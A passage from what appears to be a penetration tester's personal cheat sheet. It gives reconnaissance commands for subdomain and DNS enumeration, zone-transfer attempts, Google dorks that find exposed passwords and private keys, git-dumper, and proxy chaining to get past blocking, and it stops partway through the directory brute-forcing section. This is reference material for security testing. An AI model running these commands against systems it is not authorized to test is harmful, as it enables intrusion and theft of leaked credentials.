# Penetration Testing Cheat Sheet

This is more of a checklist for myself. May contain useful tips and tricks.

I have automated some of the tasks from this cheat sheet in my project at [ivan-sincek/auto-recon](https://github.com/ivan-sincek/auto-recon). Docker image will be available soon.

Everything was tested on Kali Linux v2024.2 (64-bit).

For help with any of the tools write `<tool_name> [-h | -hh | --help]` or `man <tool_name>`.

Sometimes `-h` can be mistaken for a host or some other option. If that's the case, use `-hh` or `--help` instead, or read the manual with `man`.

Some tools do similar tasks, but get slightly different results. Run everything you can. Many tools complement each other!

Keep in mind when no protocol nor port number in a URL is specified, i.e., if you specify only `somesite.com`, some tools will default to HTTP protocol and port 80, i.e, to `http://somesite.com:80`.

If you didn't already, read [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg). Checklist can be downloaded [here](https://github.com/OWASP/wstg/tree/master/checklists).

Highly recommend reading [Common Security Issues in Financially-Orientated Web](https://soroush.me/downloadable/common-security-issues-in-financially-orientated-web-applications.pdf).

Highly recommend doing [PortSwigger Web Security Academy](https://portswigger.net/web-security/all-labs), very underrated and super cheap.

Websites that you should use while writing the report:

* [cwe.mitre.org/data](https://cwe.mitre.org/data)
* [owasp.org/projects](https://owasp.org/projects)
* [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten)
* [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/Glossary.html)
* [first.org/cvss/calculator/4.0](https://www.first.org/cvss/calculator/4.0)
* [bugcrowd.com/vulnerability-rating-taxonomy](https://bugcrowd.com/vulnerability-rating-taxonomy)
* [nvd.nist.gov/ncp/repository](https://nvd.nist.gov/ncp/repository)
* [attack.mitre.org](https://attack.mitre.org)

My other cheat sheets:

* [Android Testing Cheat Sheet](https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet)
* [iOS Penetration Testing Cheat Sheet](https://github.com/ivan-sincek/ios-penetration-testing-cheat-sheet)
* [WiFi Penetration Testing Cheat Sheet](https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet)

## Table of Contents

**0. [Install Tools and Setup](#0-install-tools-and-setup)**

* [API Keys](#api-keys)
* [User-Agents](#user-agents)
* [DNS Resolvers](#dns-resolvers)
* [ProxyChains-NG](#proxychains-ng)

**1. [Reconnaissance](#1-reconnaissance)**

* [Useful Websites](#11-useful-websites)
* [Dmitry](#dmitry)
* [theHarvester](#theharvester)
* [FOCA](#foca-fingerprinting-organizations-with-collected-archives)
* [Sublist3r](#sublist3r)
* [assetfinder](#assetfinder)
* [Subfinder](#subfinder)
* [Amass](#amass)
* [dig](#dig)
* [Fierce](#fierce)
* [DNSRecon](#dnsrecon)
* [host](#host)
* [WHOIS](#whois)
* [ASNmap](#asnmap)
* [httpx](#httpx)
* [gau](#gau)
* [urlhunter](#urlhunter)
* [Google Dorks](#google-dorks)
* [Chad](#chad)
* [PhoneInfoga](#phoneinfoga)
* [git-dumper](#git-dumper)
* [TruffleHog](#trufflehog)
* [File Scraper](#file-scraper)
* [katana](#katana)
* [Scrapy Scraper](#scrapy-scraper)
* [Directory Fuzzing](#directory-fuzzing)
* [DirBuster](#dirbuster)
* [feroxbuster](#feroxbuster)
* [snallygaster](#snallygaster)
* [IIS Tilde Short name Scanning](#iis-tilde-short-name-scanning)
* [WhatWeb](#whatweb)
* [Parsero](#parsero)
* [EyeWitness](#eyewitness)
* [Wordlists](#wordlists)

**2. [Scanning/Enumeration](#2-scanningenumeration)**

* [Useful Websites](#21-useful-websites)
* [Nmap](#nmap)
* [testssl.sh](#testsslsh)
* [OpenSSL](#openssl)
* [keytool](#keytool)
* [uncover](#uncover)

**3. [Vulnerability Assesment/Exploiting](#3-vulnerability-assesmentexploiting)**

* [Useful Websites](#31-useful-websites)
* [Collaborator Servers](#collaborator-servers)
* [Subdomain Takeover](#subdomain-takeover)
* [Subzy](#subzy)
* [subjack](#subjack)
* [Bypassing the 401 and 403](#bypassing-the-401-and-403)
* [Nikto](#nikto)
* [WPScan](#wpscan)
* [Nuclei](#Nuclei)
* [Arjun](#arjun)
* [WFUZZ](#wfuzz)
* [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
* [HTTP Response Splitting](#http-response-splitting)
* [Cross-Site Scripting \(XSS\)](#cross-site-scripting-xss)
* [SQL Injection](#sql-injection)
* [sqlmap](#sqlmap)
* [dotdotpwn](#dotdotpwn)
* [Web Shells](#web-shells)
* [Send a Payload With Python](#send-a-payload-with-python)

**4. [Post Exploitation](#4-post-exploitation)**

* [Useful Websites](#41-useful-websites)
* [Generate a Reverse Shell Payload for Windows OS](#generate-a-reverse-shell-payload-for-windows-os)
* [PowerShell Encoded Command](#powershell-encoded-command)

**5. [Password Cracking](#5-password-cracking)**

* [Useful Websites](#51-useful-websites)
* [crunch](#crunch)
* [hash-identifier](#hash-identifier)
* [Hashcat](#hashcat)
* [Cracking the JWT](#cracking-the-jwt)
* [Hydra](#hydra)
* [Password Spraying](#password-spraying)

**6. [Social Engineering](#6-social-engineering)**

* [Drive-by Download](#drive-by-download)
* [Phishing Website](#phishing-website)

**7. [Miscellaneous](#7-miscellaneous)**

* [Useful Websites](#71-useful-websites)
* [cURL](#curl)
* [Ncat](#ncat)
* [multi/handler](#multihandler)
* [ngrok](#ngrok)
* [Additional References](#additional-references)

## 0. Install Tools and Setup

Most tools can be installed with the Linux package manager:

```bash
apt-get update && apt-get -y install sometool
```

For more information see [kali.org/tools](https://www.kali.org/tools).

---

Some Python tools need to be downloaded and installed manually:

```fundamental
python3 setup.py install
```

Or, installed from the [PyPi](https://pypi.org):

```fundamental
pip3 install sometool

python3 -m pip install sometool
```

---

Some Golang tools need to be downloaded and built manually:

```fundamental
go build sometool.go
```

Or, installed directly:

```fundamental
go install -v github.com/user/sometool@latest
```

For more information see [pkg.go.dev](https://pkg.go.dev).

To set up Golang, run:

```bash
apt-get -y install golang

echo "export GOROOT=/usr/lib/go" >> ~/.zshrc
echo "export GOPATH=$HOME/go" >> ~/.zshrc
echo "export PATH=$GOPATH/bin:$GOROOT/bin:$PATH" >> ~/.zshrc

source ~/.zshrc
```

If you use other console, you might need to write to `~/.bashrc`, etc.

---

Some tools, that are in the form of binaries or shell scripts, can be moved to `/usr/bin/` directory for the ease of use:

```bash
mv sometool.sh /usr/bin/sometool && chmod +x /usr/bin/sometool
```

---

Some Java tools need to be downloaded and ran manually with Java (JRE):

```fundamental
java -jar sometool.jar
```

### API Keys

List of useful APIs to integrate in your tools:

* [scrapeops.io](https://scrapeops.io) - bot-safe User-Agents
* [shodan.io](https://developer.shodan.io) - IoT search engine and more
* [censys.io](https://search.censys.io/api) - domain lookup and more
* [github.com](https://github.com/settings/tokens) - public source code repository lookup
* [virustotal.com](https://developers.virustotal.com/reference/overview) - malware database lookup
* [cloud.projectdiscovery.io](https://cloud.projectdiscovery.io) - ProjectDiscovery tools

### User-Agents

Download a list of bot-safe User-Agents, requires [scrapeops.io](https://scrapeops.io) API key:

```python
python3 -c 'import json, requests; open("./user_agents.txt", "w").write(("\n").join(requests.get("http://headers.scrapeops.io/v1/user-agents?api_key=SCRAPEOPS_API_KEY&num_results=100", verify = False).json()["result"]))'
```

### DNS Resolvers

Download a list of trusted DNS resolvers, or manually from [trickest/resolvers](https://github.com/trickest/resolvers):

```python
python3 -c 'import json, requests; open("./resolvers.txt", "w").write(requests.get("https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt", verify = False).text)'
```

### ProxyChains-NG

If Google or any other search engine or service blocks your tool, use ProxyChains-NG and Tor to bypass the restriction.

Installation:

```bash
apt-get update && apt-get -y install proxychains4 tor torbrowser-launcher
```

Do the following changes in `/etc/proxychains4.conf`:

```fundamental
round_robin
chain_len = 1
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 9050
```

Make sure to comment any chain type other than `round_robin` - e.g., comment `strict_chain` into `# strict_chain`.

Start Tor:

```fundamental
service tor start
```

Then, run any tool you want:

```fundamental
proxychains4 sometool
```

Using only Tor most likely won't be enough, you will need to add more proxies \([1](https://geonode.com/free-proxy-list)\)\([2](https://proxyscrape.com/home)\) to `/etc/proxychains4.conf`; however, it is hard to find free and stable proxies that are not already blacklisted.

Download a list of free proxies:

```bash
curl -s 'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc' -H 'Referer: https://proxylist.geonode.com/' | jq -r '.data[] | "\(.protocols[]) \(.ip) \(.port)"' > proxychains.txt

curl -s 'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc' -H 'Referer: https://proxylist.geonode.com/' | jq -r '.data[] | "\(.protocols[])://\(.ip):\(.port)"' > proxies.txt
```

## 1. Reconnaissance

Keep in mind that some \[legacy\] websites might only be accessible through specific web browsers such as MS Internet Explorer or MS Edge.

Keep in mind that some websites may be missing the index page and may not redirect you to the real home page. If that's the case, try to manually guess a full path to the home page, use [wayback machine](https://archive.org) or [gau](#gau) to find old URLs, or try directory fuzzing with [feroxbuster](#feroxbuster) or [DirBuster](#dirbuster).

Search the Internet for default / pre-defined paths and files for a specific web application. Use the gathered information in combination with [Google Dorks](#google-dorks), [Chad](#chad), and [httpx](#httpx) to find the same paths and files on different \[sub\]domains. For not so common web applications, try to find and browse the source code for default / pre-defined paths and files.

You can find the application's source code on [GitHub](https://github.com), [GitLab](https://gitlab.com), [Bitbucket](https://bitbucket.org), [searchcode](https://searchcode.com), etc.

Search the application's source code for hardcoded sensitive information with [TruffleHog](#trufflehog) and [File Scraper](#file-scraper). Don't forget to check old GitHub commits for old but still active API keys or credentials.

Inspect the web console for possible errors. Inspect the application's source code for possible comments.

**Don't forget to access the web server over an IP address because you might find server's default welcome page or some other content.**

Read what is [ASN](https://www.arin.net/resources/guide/asn) and [CIDR](https://aws.amazon.com/what-is/cidr) before starting your OSINT.

### 1.1 Useful Websites

* [whois.domaintools.com](https://whois.domaintools.com)
* [otx.alienvault.com](https://otx.alienvault.com) - domain lookup
* [reverseip.domaintools.com](https://reverseip.domaintools.com) - web-based reverse IP lookup
* [lookup.icann.org](https://lookup.icann.org)
* [sitereport.netcraft.com](https://sitereport.netcraft.com)
* [searchdns.netcraft.com](https://searchdns.netcraft.com) - web-based DNS lookup
* [search.censys.io](https://search.censys.io) - domain lookup and more
* [crt.sh](https://crt.sh) - certificate fingerprinting
* [commoncrawl.org](https://commoncrawl.org/get-started) - web crawl dumps
* [opendata.rapid7.com](https://opendata.rapid7.com) - scan dumps
* [searchcode.com](https://searchcode.com)
* [virustotal.com](https://www.virustotal.com/gui/home/search) - malware database lookup
* [haveibeenpwned.com](https://haveibeenpwned.com)
* [intelx.io](https://intelx.io) - database breaches
* [search.wikileaks.org](https://search.wikileaks.org)
* [archive.org](https://archive.org) - wayback machine
* [pgp.circl.lu](https://pgp.circl.lu) - OpenPGP key server
* [shodan.io](https://www.shodan.io) - IoT search engine
* [sherlockeye.io](https://sherlockeye.io) - account lookup
* [whoisds.com](https://www.whoisds.com/newly-registered-domains) - newly registered domains
* [radar.cloudflare.com](https://radar.cloudflare.com) - website lookup and more

### Dmitry

Gather information:

```fundamental
dmitry -wines -o dmitry_results.txt somedomain.com
```

Deprecated. Netcraft search does not work.

### theHarvester

Gather information:

```fundamental
theHarvester -f theharvester_results.json -b baidu,bing,bingapi,certspotter,crtsh,dnsdumpster,duckduckgo,hackertarget,otx,threatminer,urlscan,yahoo -l 500 -d somedomain.com
```

This tool is changing the search engines quite often, as such, some of them might not work as of this reading.

Sometimes the output file might default to `/usr/lib/python3/dist-packages/theHarvester/` directory.

Extract subdomains from the results:

```bash
jq '.hosts[]' theharvester_results.json | sort -uf | tee -a subdomains.txt
```

Extract IPs from the results:

```bash
jq '.ips // empty | .[]' theharvester_results.json | sort -uf | tee -a ips.txt

jq '.hosts // empty | .[] | select(contains(":")) | split(":")[1]' theharvester_results.json | sort -uf | tee -a ips.txt
```

Extract subdomains from the results:

```bash
jq '.hosts // empty | .[] | select(contains(":") | not)' theharvester_results.json | sort -uf | tee -a subdomains.txt

jq '.hosts // empty | .[] | select(contains(":")) | split(":")[0]' theharvester_results.json | sort -uf | tee -a subdomains.txt
```

Extract emails from the results:

```bash
jq '.emails // empty | .[]' theharvester_results.json | sort -uf | tee -a emails.txt
```

Extract ASNs from the results:

```bash
jq '.asns // empty | .[]' theharvester_results.json | sort -uf | tee -a asns.txt
```

### FOCA (Fingerprinting Organizations with Collected Archives)

Find metadata and hidden information in files.

Tested on Windows 10 Enterprise OS (64-bit).

Minimum requirements:

* download and install [MS SQL Server 2014 Express](https://www.microsoft.com/en-us/download/details.aspx?id=42299) or greater,
* download and install [MS .NET Framework 4.7.1 Runtime](https://dotnet.microsoft.com/download/dotnet-framework/net471) or greater,
* download and install [MS Visual C++ 2010 (64-bit)](https://www.microsoft.com/en-us/download/developer-tools.aspx) or greater,
* download and install [FOCA](https://github.com/ElevenPaths/FOCA/releases).

GUI is very intuitive.

### Sublist3r

Gather subdomains using OSINT:

```fundamental
sublist3r -o sublister_results.txt -d somedomain.com
```

### assetfinder

Gather subdomains using OSINT:

```bash
assetfinder --subs-only somedomain.com | grep -v '*' | tee assetfinder_results.txt
```

### Subfinder

Installation:

```fundamental
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

Gather subdomains using OSINT:

```fundamental
subfinder -t 10 -timeout 3 -nW -o subfinder_results.txt -rL resolvers.txt -d somedomain.com
```

**Subfinder has built-in DNS resolvers.**

Set your API keys in `/root/.config/subfinder/config.yaml` file as following:

```fundamental
shodan:
  - SHODAN_API_KEY
censys:
  - CENSYS_API_ID:CENSYS_API_SECRET
github:
  - GITHUB_API_KEY
virustotal:
  - VIRUSTOTAL_API_KEY
```

### Amass

Gather subdomains using OSINT:

```fundamental
amass enum -o amass_results.txt -trf resolvers.txt -d somedomain.com
```

**Amass has built-in DNS resolvers.**

Extract IPs from the results:

```bash
grep '(?<=(?:a_record|contains)\ \-\-\>\ )[^\s]+' amass_results.txt | sort -uf | tee -a ips.txt
```

Extract subdomains from the results:

```bash
grep '^[^\s]+(?=\ \(FQDN\))|(?<=ptr_record\ \-\-\>\ )[^\s]+' amass_results.txt | sort -uf | tee -a subdomains.txt
```

Extract canonical names (CNAMEs) from the results:

```bash
grep '(?<=(?:a_record|contains)\ \-\-\>\ )[^\s]+' amass_results.txt | sort -uf | tee -a cnames.txt
```

The below ASN and CIDR scans will take a long time to finish.

**If ASN belongs to a cloud provider, you will get a lot of CIDRs / IPs, which might not be all within your scope!**

Gather subdomains from ASN:

```fundamental
amass intel -o amass_asn_results.txt -trf resolvers.txt -asn 13337
```

Gather subdomains from CIDR:

```fundamental
amass intel -o amass_cidr_results.txt -trf resolvers.txt -cidr 192.168.8.0/24
```

### dig

Fetch name servers:

```fundamental
dig +noall +answer -t NS somedomain.com
```

Fetch mail exchange servers:

```fundamental
dig +noall +answer -t MX somedomain.com
```

Interrogate a name server:

```fundamental
dig +noall +answer -t ANY somedomain.com @ns.somedomain.com
```

Fetch the zone file from a name server:

```fundamental
dig +noall +answer -t AXFR somedomain.com @ns.somedomain.com
```

Reverse IP lookup:

```fundamental
dig +noall +answer -x 192.168.8.5
```

\[Subdomain Takeover\] Check if subdomains are dead, look for `NXDOMAIN`, `SERVFAIL`, or `REFUSED` status codes:

```bash
for subdomain in $(cat subdomains.txt); do res=$(dig "${subdomain}" -t A +noall +comments +timeout=3 | grep -Po '(?<=status\:\ )[^\s]+(?<!\,)'); echo "${subdomain} | ${res}"; done | sort -uf | tee -a subdomains_to_status.txt

grep -v 'NOERROR' subdomains_to_status.txt | grep -Po '[^\s]+(?=\ \|)' | sort -uf | tee -a subdomains_errors.txt

grep 'NOERROR' subdomains_to_status.txt | grep -Po '[^\s]+(?=\ \|)' | sort -uf | tee subdomains.txt # overwrite
```

See how to gather canonical names (CNAMEs) for the dead subdomains with [host](#host).

### Fierce

Interrogate name servers:

```fundamental
fierce -file fierce_std_results.txt --domain somedomain.com

fierce -file fierce_brt_results.txt --subdomain-file subdomains-top1mil.txt --domain somedomain.com
```

**By default, Fierce will perform dictionary attack with its built-in wordlist.**

### DNSRecon

Interrogate name servers:

```fundamental
dnsrecon -t std --json /root/Desktop/dnsrecon_std_results.json -d somedomain.com

dnsrecon -t axfr --json /root/Desktop/dnsrecon_axfr_results.json -d somedomain.com

dnsrecon --iw -f --threads 50 --lifetime 3 -t brt --json /root/Desktop/dnsrecon_brt_results.json -D subdomains-top1mil.txt -d somedomain.com
```

DNSRecon can perform a dictionary attack with a user-defined wordlist, but make sure to specify a full path to the wordlist; otherwise, DNSRecon might not recognize it.

Make sure to specify a full path to the output file; otherwise, it will default to `/usr/share/dnsrecon/` directory, i.e., to the root directory.

Extract subdomains from the results:

```bash
jq -r '.[] | select(.type | test("^A$|^CNAME$|^SRV$")) | .name // empty, .target // empty' dnsrecon_std_results.json | sort -uf | tee -a subdomains.txt
```

Extract IPs from the results:

```bash
jq -r '.[] | select(.type | test("^A$|^CNAME$|^PTR$")) | .address // empty' dnsrecon_std_results.json | sort -uf | tee -a ips.txt
```

Extract canonical names (CNAMEs) from the results:

```bash
jq -r '.[] | select(.type | test("^CNAME$")) | .target // empty' dnsrecon_std_results.json | sort -uf | tee -a cnames.txt
```

Reverse IP lookup:

```fundamental
dnsrecon --json /root/Desktop/dnsrecon_ptr_results.json -s -r 192.168.8.0/24
```

Extract subdomains from the reverse IP lookup results:

```bash
jq -r '.[] | if type == "array" then .[].name else empty end' dnsrecon_ptr_results.json | sort -uf | tee -a subdomains.txt
```

### host

**Some DNS servers will not respond to DNS quieries of type 'ANY', use type 'A' instead.**

Gather IPs for the given subdomains (ask for `A` records):

```bash
for subdomain in $(cat subdomains.txt); do res=$(host -t A "${subdomain}" | grep -Po '(?<=has\ address\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${subdomain} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a subdomains_to_ips.txt

grep -Po '(?<=\|\ )[^\s]+' subdomains_to_ips.txt | sort -uf | tee -a ips.txt
```

Check if subdomains are alive with [httpx](#httpx).

Check if IPs are alive with [Nmap](#nmap), performing a ping sweep.

Gather subdomains for the given IPs (ask for `PTR` records):

```bash
for ip in $(cat ips.txt); do res=$(host -t PTR "${ip}" | grep -Po '(?<=domain\ name\ pointer\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_subdomains.txt

grep -Po '(?<=\|\ )[^\s]+' ips_to_subdomains.txt | sort -uf | tee -a subdomains.txt
```

Gather canonical names (CNAMEs) for the given \[dead\] subdomains (ask for `CNAME` records):

```bash
for subdomain in $(cat subdomains_errors.txt); do res=$(host -t CNAMES "${subdomain}" | grep -Po '(?<=is\ an\ alias\ for\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${subdomain} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a subdomains_errors_to_cnames.txt

grep -Po '(?<=\|\ )[^\s]+' subdomains_errors_to_cnames.txt | sort -uf | tee -a subdomains_takeovers.txt
```

### WHOIS

Gather ASNs from IPs:

```bash
for ip in $(cat ips.txt); do res=$(whois -h whois.cymru.com "${ip}" | grep -Poi '^\d+'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_asns.txt

grep -Po '(?<=\|\ )(?(?!\ \|).)+' ips_to_asns.txt | sort -uf | tee -a asns.txt
```

**If ASN belongs to a cloud provider, you will get a lot of CIDRs / IPs, which might not be all within your scope!**

Gather organization names from IPs:

```bash
for ip in $(cat ips.txt); do res=$(whois -h whois.arin.net "${ip}" | grep -Po '(?<=OrgName\:)[\s]+\K.+'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_organization_names.txt

grep -Po '(?<=\|\ )(?(?!\ \|).)+' ips_to_organization_names.txt | sort -uf | tee -a organization_names.txt
```

Check if any of the IPs belong to [GitHub](https://github.com) organization, read more about GitHub takeover in this [H1 article](https://www.hackerone.com/application-security/guide-subdomain-takeovers).

### ASNmap

Installation:

```fundamental
go install -v github.com/projectdiscovery/asnmap/cmd/asnmap@latest
```

Get the ProjectDiscovery API key from [cloud.projectdiscovery.io](https://cloud.projectdiscovery.io) and run:

```fundamental
asnmap -auth
```

Fetch ASN for IP:

```bash
asnmap --silent -r resolvers.txt -i ip | tee -a asnmap_asn_results.txt
```

Fetch CIDRs for ASN:

```bash
asnmap --silent -r resolvers.txt -a asn | tee -a asnmap_cidr_results.txt
```

**If ASN belongs to a cloud provider, you will get a lot of CIDRs / IPs, which might not be all within your scope!**

Fetch CIDRs for organization ID:

```bash
asnmap --silent -r resolvers.txt -org id | tee -a asnmap_cidr_results.txt
```

### httpx

Check if subdomains are alive, map live hosts:

```bash
httpx-toolkit -o httpx_results.txt -l subdomains.txt

httpx-toolkit -random-agent -json -o httpx_results.json -threads 100 -timeout 3 -l subdomains.txt -ports 80,81,443,4443,8000,8008,8080,8081,8403,8443,8888,9000,9008,9080,9081,9403,9443
```

Filter out subdomains from the JSON results:

```bash
jq -r 'select(."status-code" | tostring | test("^2|^3|^4")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long.txt

jq -r 'select(."status-code" | tostring | test("^2")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long_2xx.txt

jq -r 'select(."status-code" | tostring | test("^2|^4")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long_2xx_4xx.txt

jq -r 'select(."status-code" | tostring | test("^3")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long_3xx.txt

jq -r 'select(."status-code" | tostring | test("^401$")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long_401.txt

jq -r 'select(."status-code" | tostring | test("^403$")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long_403.txt

jq -r 'select(."status-code" | tostring | test("^4")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long_4xx.txt

jq -r 'select(."status-code" | tostring | test("^5")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long_5xx.txt

grep -Po 'http\:\/\/[^\s]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live_long_http.txt

grep -Po 'https\:\/\/[^\s]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live_long_https.txt

grep -Po '(?<=\:\/\/)[^\s]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live_short.txt

grep -Po '(?<=http\:\/\/)[^\s]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live_short_http.txt

grep -Po '(?<=https\:\/\/)[^\s]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live_short_https.txt

grep -Po '(?<=\:\/\/)[^\s\:]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live.txt
```

Check if a path exists on a web server:

```bash
httpx-toolkit -status-code -content-length -o httpx_results.txt -l subdomains_live_long.txt -path /.git
```

### gau

Gather URLs from the [wayback machine](https://archive.org):

```bash
getallurls somedomain.com | tee gau_results.txt

for subdomain in $(cat subdomains_live.txt); do getallurls "${subdomain}"; done | sort -uf | tee gau_results.txt
```

Filter out URLs from the results:

```bash
httpx-toolkit -random-agent -json -o httpx_gau_results.json -threads 100 -timeout 3 -r resolvers.txt -l gau_results.txt

jq -r 'select(."status-code" | tostring | test("^2")).url' httpx_gau_results.json | sort -uf | tee -a gau_2xx_results.txt

jq -r 'select(."status-code" | tostring | test("^2|^4")).url' httpx_gau_results.json | sort -uf | tee -a gau_2xx_4xx_results.txt

jq -r 'select(."status-code" | tostring | test("^3")).url' httpx_gau_results.json | sort -uf | tee -a gau_3xx_results.txt

jq -r 'select(."status-code" | tostring | test("^401$")).url' httpx_gau_results.json | sort -uf | tee -a gau_401_results.txt

jq -r 'select(."status-code" | tostring | test("^403$")).url' httpx_gau_results.json | sort -uf | tee -a gau_403_results.txt
```

### urlhunter

Installation:

```bash
go install -v github.com/utkusen/urlhunter@latest
```

Gather URLs from URL shortening services:

```fundamental
urlhunter -o urlhunter_results.txt -date latest -keywords subdomains_live.txt
```

### Google Dorks

Google Dork databases:

* [exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)
* [cxsecurity.com/dorks](https://cxsecurity.com/dorks)
* [pentest-tools.com/information-gathering/google-hacking](https://pentest-tools.com/information-gathering/google-hacking)
* [opsdisk/pagodo/blob/master/dorks/all_google_dorks.txt](https://github.com/opsdisk/pagodo/blob/master/dorks/all_google_dorks.txt)

Check the list of `/.well-known/` files [here](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml).

Google Dorking will not show directories nor files that are disallowed in `robots.txt`, to check for such directories and files use [httpx](#httpx).

Append `site:www.somedomain.com` to limit your scope to a specified subdomain.

Append `site:*.somedomain.com` to limit your scope to all subdomains.

Append `site:*.somedomain.com -www` to exclude `www` subdomain from the results.

Simple Google Dorks:

```fundamental
inurl:/robots.txt intext:disallow ext:txt

inurl:/.well-known/security.txt ext:txt

inurl:/info.php intext:"php version" ext:php

intitle:"index of /" intext:"parent directory"

intitle:"index of /.git" intext:"parent directory"

inurl:/gitweb.cgi

intitle:"Dashboard [Jenkins]"

(intext:"mysql database" AND intext:db_password) ext:txt

intext:-----BEGIN PGP PRIVATE KEY BLOCK----- (ext:pem OR ext:key OR ext:txt)
```

### Chad

Find and download files using a Google Dork:

```fundamental
mkdir chad_downloads

chad -nsos -o chad_downloads_results.json -dir chad_downloads -tr 200 -q "ext:txt OR ext:json OR ext:yml OR ext:pdf OR ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:zip OR ext:tar OR ext:rar OR ext:gzip OR ext:7z" -s *.somedomain.com
```

Extract authors (and more) from the files:

```bash
apt-get -y install libimage-exiftool-perl

exiftool -S chad_downloads | grep -Po '(?<=Author\:\ ).+' | sort -uf | tee -a people.txt
```

Find directory listings using a Google Dork:

```fundamental
chad -nsos chad_directory_listings_results.json -tr 200 -q 'intitle:"index of /" intext:"parent directory"' -s *.somedomain.com
```

More about my project at [ivan-sincek/chad](https://github.com/ivan-sincek/chad).

### PhoneInfoga

Download the latest version from [GitHub](https://github.com/sundowndev/phoneinfoga/releases) and check how to [install](#0-install-tools-and-setup) the tool.

Get a phone number information:

```fundamental
phoneinfoga scan -n +1111111111
```

Get a phone number information using the web UI:

```fundamental
phoneinfoga serve
```

Navigate to `http://localhost:5000` with your preferred web browser.

### git-dumper

Try to reconstruct a GitHub repository, i.e., get the source code, based on the commit history from a public `/.git` directory:

```fundamental
git-dumper https://somesite.com/.git git_dumper_results
```

This tool might not be able to reconstruct the whole repository every time, but it could still reveal some sensitive information.

Some additional `git` commands to try on the cloned `/.git` directory:

```fundamental
git status

git log

git checkout -- .

git restore .
```

Use [Google Dorking](#google-dorks) and [Chad](#chad) to find more targets.

# TruffleHog

Installation:

```bash
git clone https://github.com/trufflesecurity/trufflehog && cd trufflehog

go install
```

Search for sensitive information inside a single repository or the whole organization on GitHub:

```fundamental
trufflehog git https://github.com/trufflesecurity/test_keys --only-verified --json

trufflehog github --org=trufflesecurity --only-verified --json
```

Search for sensitive information inside files and directories:

```fundamental
trufflehog filesystem somefile_1.txt somefile_2.txt somedir1 somedir2
```

## File Scraper

More about my project at [ivan-sincek/file-scraper](https://github.com/ivan-sincek/file-scraper).

### katana

Installation:

```fundamental
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
```

Crawl a website:

```fundamental
katana -timeout 3 -retry 1 -c 30 -o katana_results.txt -ps -jc -iqp -d 1 -u https://somesite.com/home

katana -timeout 3 -retry 1 -c 30 -o katana_results.txt -ps -jc -iqp -d 1 -u subdomains_live_long_2xx.txt
```

### Scrapy Scraper

Crawl a website, download, and beautify \[minified\] JavaScript files:

```fundamental
scrapy-scraper -cr 30 -a random -o scrapy_scraper_results.txt -p -r 1 -dir somedir -u https://somesite.com/home

scrapy-scraper -cr 30 -a random -o scrapy_scraper_results.txt -p -r 1 -dir somedir -u subdomains_live_long_2xx.txt
```

In case you get no results while using Playwright's headless browser, try updating it:

```fundamental
pip3 install --upgrade playwright

playwright install chromium
```

More about my project at [ivan-sincek/scrapy-scraper](https://github.com/ivan-sincek/scrapy-scraper).

Scrape the JavaScript files for sensitive information using [TruffleHog](#trufflehog) and [File Scraper](#file-scraper).

### Directory Fuzzing

**Don't forget that GNU/Linux OS has a case sensitive file system, so make sure to use the right wordlists.**

If you don't get any hits while brute forcing directories, try to brute force files by specifying file extensions.

The below tools support recursive directory and file search. Also, they might take a long time to finish depending on the used settings and wordlist.

### DirBuster

<p align="center"><img src="https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/img/dirbuster.png" alt="DirBuster"></p>

<p align="center">Figure 1 - DirBuster</p>

All DirBuster's wordlists are located at `/usr/share/dirbuster/wordlists/` directory.

### feroxbuster

Brute force directories on a web server:

```fundamental
cat subdomains_live_long.txt | feroxbuster --stdin -k -n --auto-bail --random-agent -t 50 -T 3 --json -o feroxbuster_results.txt -s 200,301,302,401,403 -w raft-small-directories-lowercase.txt
```

This tool is way faster than [DirBuster](#dirbuster).

Filter out directories from the results:

```bash
jq -r 'select(.status | tostring | test("^2")).url' feroxbuster_results.json | sort -uf | tee -a directories_2xx.txt

jq -r 'select(.status | tostring | test("^2|^4")).url' feroxbuster_results.json | sort -uf | tee -a directories_2xx_4xx.txt

jq -r 'select(.status | tostring | test("^3")).url' feroxbuster_results.json | sort -uf | tee -a directories_3xx.txt

jq -r 'select(.status | tostring | test("^401$")).url' feroxbuster_results.json | sort -uf | tee -a directories_401.txt

jq -r 'select(.status | tostring | test("^403$")).url' feroxbuster_results.json | sort -uf | tee -a directories_403.txt
